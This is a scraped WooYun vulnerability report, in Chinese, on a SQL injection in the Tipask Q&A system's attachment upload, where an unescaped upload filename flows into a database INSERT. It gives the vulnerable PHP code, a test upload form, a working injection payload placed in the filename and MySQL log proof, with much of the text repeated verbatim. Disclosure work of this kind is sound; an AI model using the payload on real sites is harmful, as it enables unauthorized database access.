{"id": 74752, "wybug_id": "wooyun-2016-0170295", "wybug_title": "tipask系统又一注入漏洞", "wybug_corp": "tipask", "wybug_author": "pang0lin", "wybug_date": "2016-01-17 11:56", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-02-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： tipask注入漏洞 详细说明：  1.首先定位到漏洞文件control/attach.php。\nfunction onupload() {        //上传配置        $config = array(            \"uploadPath\" => \"data/attach/\", //保存路径            \"fileType\" => array(\".rar\", \".doc\", \".docx\", \".zip\", \".pdf\", \".txt\", \".swf\", \".wmv\", \"xsl\"), //文件允许格式            \"fileSize\" => 10 //文件大小限制，单位MB        );//文件上传状态,当成功时返回SUCCESS，其余值将直接返回对应字符窜        $state = \"SUCCESS\";        $clientFile = $_FILES[\"upfile\"];        if (!isset($clientFile)) {            echo \"{'state':'文件大小超出服务器配置！','url':'null','fileType':'null'}\"; //请修改php.ini中的upload_max_filesize和post_max_size            exit;        }//格式验证        $current_type = strtolower(strrchr($clientFile[\"name\"], '.'));        if (!in_array($current_type, $config['fileType'])) {            $state = \"不支持的文件类型！\";        }//大小验证        $file_size = 1024 * 1024 * $config['fileSize'];        if ($clientFile[\"size\"] > $file_size) {            $state = \"文件大小超出限制！\";        }//保存文件        if ($state == \"SUCCESS\") {            $targetfile = $config['uploadPath'] . gmdate('ym', $this->time) . '/' . random(8) . strrchr($clientFile[\"name\"], '.');            $result = $_ENV['attach']->movetmpfile($clientFile, $targetfile);            if (!$result) {                $state = \"文件保存失败！\";            } else {                $_ENV['attach']->add($clientFile[\"name\"], $current_type, $clientFile[\"size\"], $targetfile, 0);//这里是漏洞点            }        }//向浏览器返回数据json数据        echo '{\"state\":\"' . $state . '\",\"url\":\"' . $targetfile . '\",\"fileType\":\"' . $current_type . '\",\"original\":\"' . $clientFile[\"name\"] . '\"}';    }\n2.这里是上传的逻辑代码，本身的上传没有什么问题。但是在上传之后进行了一次数据库操作，并且直接带入了$clientFile[\"name\"]。\n$clientFile = $_FILES[\"upfile\"];\n而$_FILES本身是不受addslashes的影响的。所以不受全局过滤的影响。那么我们构造一个上传的表单(_FILES是真的不受影响吗？为什么不亲自测试测试)\n<html><body><form action=\"http://localhost/tipask/index.php?attach/upload\" method=\"post\"enctype=\"multipart/form-data\"><label for=\"file\">Filename:</label><input type=\"file\" name=\"upfile\" id=\"file\" /> <br /><input type=\"submit\" name=\"submit\" value=\"Submit\" /></form></body></html>\n3.上传的时候使用burp抓包，修改其中filename字段的值为conf',user(),1,1,0,1) -- a\n\n4.然后看一下数据库中的表。\n\n5.再来看一下mysql日志呢\n160115 23:23:29\t  168 Connect\troot@localhost on \t\t  168 Query\tSET character_set_connection=gbk, character_set_results=gbk, character_set_client=binary\t\t  168 Query\tSET sql_mode=''\t\t  168 Init DB\ttipask\t\t  168 Query\tSELECT * FROM ask_badword\t\t  168 Query\tSELECT * FROM ask_user WHERE uid='1'\t\t  168 Query\tSELECT * FROM ask_user_category WHERE uid=1\t\t  168 Query\tUPDATE ask_session SET `time` = 1452871409 WHERE sid='bb76277b670c297a'\t\t  168 Query\tSELECT * FROM ask_banned\t\t  168 Query\tINSERT INTO ask_attach(time,filename,filetype,filesize,location,isimage,uid)  VALUES (1452871409,'conf',user(),1,1,0,1) -- a.rar','.rar','2576','data/attach/1601/1zfBosk4.rar',0,1)\t\t  168 Quit\n//文件上传状态,当成功时返回SUCCESS，其余值将直接返回对应字符窜        $state = \"SUCCESS\";        $clientFile = $_FILES[\"upfile\"];        if (!isset($clientFile)) {            echo \"{'state':'文件大小超出服务器配置！','url':'null','fileType':'null'}\"; //请修改php.ini中的upload_max_filesize和post_max_size            exit;        }//格式验证        $current_type = strtolower(strrchr($clientFile[\"name\"], '.'));        if (!in_array($current_type, $config['fileType'])) {            $state = \"不支持的文件类型！\";        }//大小验证        $file_size = 1024 * 1024 * $config['fileSize'];        if ($clientFile[\"size\"] > $file_size) {            $state = \"文件大小超出限制！\";        }//保存文件        if ($state == \"SUCCESS\") {            $targetfile = $config['uploadPath'] . gmdate('ym', $this->time) . '/' . random(8) . strrchr($clientFile[\"name\"], '.');            $result = $_ENV['attach']->movetmpfile($clientFile, $targetfile);            if (!$result) {                $state = \"文件保存失败！\";            } else {                $_ENV['attach']->add($clientFile[\"name\"], $current_type, $clientFile[\"size\"], $targetfile, 0);//这里是漏洞点            }        }//向浏览器返回数据json数据        echo '{\"state\":\"' . $state . '\",\"url\":\"' . $targetfile . '\",\"fileType\":\"' . $current_type . '\",\"original\":\"' . $clientFile[\"name\"] . '\"}';    }</code>2.这里是上传的逻辑代码，本身的上传没有什么问题。但是在上传之后进行了一次数据库操作，并且直接带入了$clientFile[\"name\"]。\n$clientFile = $_FILES[\"upfile\"];\n而$_FILES本身是不受addslashes的影响的。所以不受全局过滤的影响。那么我们构造一个上传的表单\n<html><body><form action=\"http://localhost/tipask/index.php?attach/upload\" method=\"post\"enctype=\"multipart/form-data\"><label for=\"file\">Filename:</label><input type=\"file\" name=\"upfile\" id=\"file\" /> <br /><input type=\"submit\" name=\"submit\" value=\"Submit\" /></form></body></html>\n3.上传的时候使用burp抓包，修改其中filename字段的值为conf',user(),1,1,0,1) -- a   漏洞证明：  \n160115 23:23:29\t  168 Connect\troot@localhost on \t\t  168 Query\tSET character_set_connection=gbk, character_set_results=gbk, character_set_client=binary\t\t  168 Query\tSET sql_mode=''\t\t  168 Init DB\ttipask\t\t  168 Query\tSELECT * FROM ask_badword\t\t  168 Query\tSELECT * FROM ask_user WHERE uid='1'\t\t  168 Query\tSELECT * FROM ask_user_category WHERE uid=1\t\t  168 Query\tUPDATE ask_session SET `time` = 1452871409 WHERE sid='bb76277b670c297a'\t\t  168 Query\tSELECT * FROM ask_banned\t\t  168 Query\tINSERT INTO ask_attach(time,filename,filetype,filesize,location,isimage,uid)  VALUES (1452871409,'conf',user(),1,1,0,1) -- a.rar','.rar','2576','data/attach/1601/1zfBosk4.rar',0,1)\t\t  168 Quit\n   修复方案：  过滤   版权声明：转载请注明来源 pang0lin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}